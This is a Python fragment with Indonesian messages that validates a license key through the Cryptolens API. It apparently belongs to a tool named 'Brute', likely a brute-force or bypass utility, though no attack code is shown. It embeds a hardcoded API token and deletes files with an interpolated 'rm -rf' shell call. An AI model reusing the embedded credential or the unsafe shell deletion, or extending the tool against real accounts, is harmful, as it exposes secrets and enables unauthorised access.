    def confirm(self, keys, token='WyI2NzQ4NDUwMSIsIkR0amJabXAwZ01pelp6UjYvcWdKejRybEtIWEIyNUFCR0cvOERpN1QiXQ==', produc_id='22718'):
        import datetime
        skrg = datetime.datetime.now()
        hari = skrg.day
        buln = skrg.month
        thun = skrg.year
        try:
            link = requests.get("https://app.cryptolens.io/api/key/Activate?token={}&ProductId={}&Key={}".format(token,produc_id,keys)).json()
            print(link)
            expd = link["licenseKey"]["expires"][:10]
            tahun,bulan,tanggal = expd.split("-")
            date = "%s%s%s"%(int(tanggal),int(bulan),int(tahun))
            neww = "%s%s%s"%(hari,buln,thun)
            if (len(neww)) == 7:
               neww = "0%s%s%s"%(hari,buln,thun)
            else:
               neww = neww
            form = "%d%m%Y"
            tess = datetime.datetime.strptime(date,form)
            mekk = datetime.datetime.strptime(neww,form)
            xnxx = tess - mekk
            sisa = xnxx.days
            if sisa <1:
               os.system(f'rm -rf {self.dire}/key.txt')
               input(f'\n{END}[{BLUE}LICENSI KAMU TELAH KADARLUARSA ENTER UNTUK KEMBALI{END}]');self.Keys()
            else:
               self.byps.Clear()
               self.byps.Logos()
               print(f'{END}[{BLUE}Licensi Aktive{END}]\n{END}[{BLUE}+{END}] Berakhir Dalam {GREEN}{sisa}{END} Hari');time.sleep(2)
               open(self.dire+'/key.txt','w',encoding='utf-8').write(f'{keys}')
               open(self.dire+'/day.txt','w',encoding='utf-8').write(f'{sisa}')
               self.byps.Menu(sisa)
        except KeyError:
           os.system(f'rm -rf {self.dire}/key.txt')
           exit(f'{END}[{BLUE}+{END}] Invalid Keys')
        except Exception as e:print(e)

    def CekKeys(self):
        if os.path.isfile(f'{self.dire}/key.txt') is True:
           keys = open(self.dire+'/key.txt','r').read()
           self.confirm(keys)
        else:
           self.Keys()

Require().socks()
Brute().Menu()
